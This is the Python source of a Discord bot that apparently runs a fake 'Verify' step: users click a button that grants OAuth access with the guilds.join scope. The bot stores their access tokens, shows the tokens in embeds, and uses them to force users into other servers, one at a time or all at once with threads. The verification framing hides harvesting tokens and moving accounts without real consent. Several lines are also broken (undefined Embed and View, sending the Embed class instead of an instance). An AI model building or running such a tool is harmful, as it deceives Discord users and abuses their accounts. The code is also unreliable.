import discord
import json
import requests
import os 
import time
from pystyle import Colors
from discord import ButtonStyle
from discord.ui import Button
from discord.ext import commands
import threading

def process_user(x, token, guild_id, allowed, failed):
    try:
        info = get_user_data(x)
        id = str(info['id'])
        pull_to_guild(token, x, guild_id, id)
        allowed.append(x)
    except Exception:
        failed.append(x)
def get_user_data(token):
    headers = {
        "Authorization" : f"Bearer {token}"
    }
    r = requests.get("https://discord.com/api/v8/users/@me", headers = headers)
    return r.json()

def pull_to_guild(bot_token, token, guild_id, id):
    
    data = {
        "access_token" : token
    }
    headers = {
        "Authorization" : f"Bot {bot_token}",
        'Content-Type': 'application/json'

    }
    r = requests.put(f'https://discord.com/api/v8/guilds/{guild_id}/members/{id}',
                      headers=headers, json=data).json()
    return r

os.system('cls')
with open("saved.json", "r+") as a:
    print("[...] Checking for tokens")
    aa = json.load(a)
    if aa['config']['bot_token'] == "":
        token = input(f"{Colors.light_blue}[>] {Colors.blue}Bot token: ")

    else:
        token = aa['config']['bot_token']
    role_id = input(f"{Colors.light_blue}[>] {Colors.blue}Enter Role id: ")
    client_id = input(f"{Colors.light_blue}[>] {Colors.blue}Enter client id: ")
    url_hosted = input(f"{Colors.light_blue}[>] {Colors.blue}Enter URL you're hosting with if testing locally type (http://localhost:8080): ")

bot = commands.Bot(command_prefix="-", help_command=None, intents=discord.Intents.all())
@bot.command()
async def active_users(ctx):
    with open("saved.json", "r+") as b:
        bb = json.load(b)
        array = bb['array']
        embed = discord.Embed(title="Active users", description="")
        for _ in array:
            try:
                data = get_user_data(_)
                id = data['id']
                embed.add_field(name=f"{data['username']}#{data['discriminator']}", value=f"id: `{id}`\nAccess Token: `{_}`")

            except Exception as e:
                print(e)
                pass
        await ctx.send(embed=discord.Embed)
@bot.command()
async def user(ctx, token):
    try:
        nitro = False
        data = get_user_data(token)
        if data['premium_type'] > 0:
            nitro = True
        user = bot.get_user(int(data['id'])); print ()
        embed = Embed(title=f"{data['username']}'s info", description=f"""
        ID: `{data['id']}`
        Nitro: `{nitro}`
        Created-At: `{user.created_at}`
        """)
        if user.avatar == "" or user.avatar is None:
            url = user.default_avatar
        else:
            url = user.avatar.url
        embed.set_thumbnail(url=url)
    except Exception as e:
        print(e)
        embed=discord.Embed(title="Failed", description="Failed to fetch user's data") 
    await ctx.send(embed=discord.Embed)
@bot.command()
async def pull(ctx, token2, guild_id, uid):
    try:
        a = pull_to_guild(token, token2, guild_id, uid)
        print(a)
        await ctx.send(embed=discord.Embed(title="Pulled user", 
                                           description="Sucessfully added the user to the guild!"))
    except Exception as e:
        print(e)
        await ctx.send(embed=discord.Embed(title="Failed to pull user",
                                            description="This didn't seem to work :(!"))

@bot.command()
async def pull_all(ctx, guild_id):
    start = time.time()
    failed = []
    threads = []
    allowed = []
    with open("saved.json", "r+") as f:
        ff = json.load(f)
        array = ff['array']
        for x in array:
            t = threading.Thread(target=process_user, args=(x, token, guild_id, allowed,
                                                             failed))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        end = time.time()
        await ctx.send(embed=discord.Embed(title="Pull summary", 
                                           description=f"**Auth tokens pulled to guild:** {allowed}\n**Failed to pull:** {failed}\n**Time taken:** `{end-start} seconds`",
                                             color=discord.Color.blurple()))

         


@bot.command()
async def setup(ctx, channel:int = None):
    if channel is None:
        button = Button(
            style=ButtonStyle.link,
            label="Verify",
            url=f"https://discord.com/api/oauth2/authorize?client_id={client_id}&redirect_uri={url_hosted}/callback&response_type=code&scope=identify%20guilds%20email%20guilds.join"
        )
        guild = ctx.message.guild
        a = await guild.create_text_channel("Verify")
        await a.set_permissions(guild.default_role, view_channel=True)
        role = guild.get_role(int(role_id))
        await a.set_permissions(role, view_channel=False)

        b = await guild.create_text_channel("Log")
        await b.set_permissions(guild.default_role, view_channel=False)
        b1 = b.id
        vie = View()
        vie.add_item(button)
        with open("saved.json", "r+") as f:
            ff = json.load(f)
            b = await b.create_webhook(name="GoAuth")
            print(b)
            ff['log'] = b.url
            ff['config'] = {
            
            "guild":guild.id,
            "bot_token":token
            
            }
            print(b.url)
            f.truncate(0)
            f.seek(0)
            json.dump(ff, f, indent=4)
        await a.send(embed=discord.Embed(title="Verify",
         description="Click the button below to verify in this server!"), view=vie)


    await ctx.reply(embed=discord.Embed(title="Created",
     description=f"Sucessfully set up verification in <#{a.id}>! All logs will be sent to <#{b1}>"))
bot.run(token)
